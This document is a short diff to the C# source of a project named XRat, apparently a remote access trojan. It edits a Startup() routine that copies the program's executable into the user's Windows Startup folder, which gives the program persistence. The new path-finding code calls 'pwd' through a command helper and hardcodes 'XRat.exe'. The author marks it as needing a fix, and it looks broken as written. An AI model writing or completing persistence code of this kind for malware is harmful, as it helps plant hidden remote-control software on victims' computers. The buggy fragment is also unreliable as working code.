@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Windows.Forms.Design;
 
 namespace XRat
 {
@@ -174,16 +175,16 @@ namespace XRat
 
         public static string Startup()
         {
-            // Получаем путь к текущему исполняемому файлу
-            string sourceFilePath = Assembly.GetExecutingAssembly().Location;
-
             // Получаем путь к папке автозагрузки текущего пользователя
             string userStartupFolder = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.Startup)
             );
 
             // Получаем имя файла (с расширением)
-            string fileName = Path.GetFileName(sourceFilePath);
+            string sourceFilePath = ProCMD("pwd").output;
+            sourceFilePath = sourceFilePath + "XRat.exe"; // Исправить!!!!!
+
+            string fileName = "XRat.exe";
 
             // Путь, куда будет скопирован файл
             string destinationFilePath = Path.Combine(userStartupFolder, fileName);
